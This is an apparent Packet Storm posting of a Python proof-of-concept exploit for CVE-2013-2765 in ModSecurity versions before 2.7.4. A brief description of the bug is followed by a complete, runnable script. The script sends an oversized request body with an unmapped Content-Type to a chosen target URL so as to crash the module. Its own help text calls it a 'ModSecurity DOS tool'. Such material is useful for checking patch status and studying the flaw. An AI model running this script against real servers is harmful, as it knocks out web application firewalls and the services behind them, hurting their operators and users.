Source: http://packetstormsecurity.com/files/121815/modsecurity_cve_2013_2765_check.py.txt
When ModSecurity receives a request body with a size bigger than the value set by the "SecRequestBodyInMemoryLimit" and with a "Content-Type" that has no request body processor mapped to it, ModSecurity will systematically crash on every call to "forceRequestBodyVariable" (in phase 1). This is the proof of concept exploit. Versions prior to 2.7.4 are affected.

#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#
# Created on Mar 29, 2013
#
# @author: Younes JAAIDI <yjaaidi@shookalabs.com>
#

import argparse
import http.client
import logging
import sys
import urllib.request

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
logger.addHandler(logging.StreamHandler(sys.stderr))

class ModSecurityDOSCheck(object):

    _DEFAULT_REQUEST_BODY_SIZE = 200 # KB
    _DEFAULT_CONCURRENCY = 100
    _DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36"

    def __init__(self):
        self._request_counter = 0
        self._status_message = None

    def main(self, args_list):
        args_object = self._parse_args(args_list)
        
        payload = "A" * args_object.request_body_size * 1024
        
        request = urllib.request.Request(args_object.target_url,
                                         method = "GET",
                                         data = payload.encode('utf-8'),
                                         headers = {'Content-Type': 'text/random',
                                                    'User-Agent': self._DEFAULT_USER_AGENT})
        
        if self._send_request(request):
            logger.info("Target seems to be vulnerable!!!")
            return 0
        else:
            logger.info("Attack didn't work. Try increasing the 'REQUEST_BODY_SIZE'.")
            return 1

    def _parse_args(self, args_list):
        parser = argparse.ArgumentParser(description="ModSecurity DOS tool.")
        parser.add_argument('-t', '--target-url',
                            dest = 'target_url',
                            required = True,
                            help = "Target URL")
        parser.add_argument('-s', '--request-body-size',
                            dest = 'request_body_size',
                            default = self._DEFAULT_REQUEST_BODY_SIZE,
                            type = int,
                            help = "Request body size in KB")
        
        return parser.parse_args()

    def _send_request(self, request):
        try:
            urllib.request.urlopen(request)
            return False
        except (http.client.BadStatusLine, urllib.error.HTTPError):
            return True

if __name__ == '__main__':
    sys.exit(ModSecurityDOSCheck().main(sys.argv))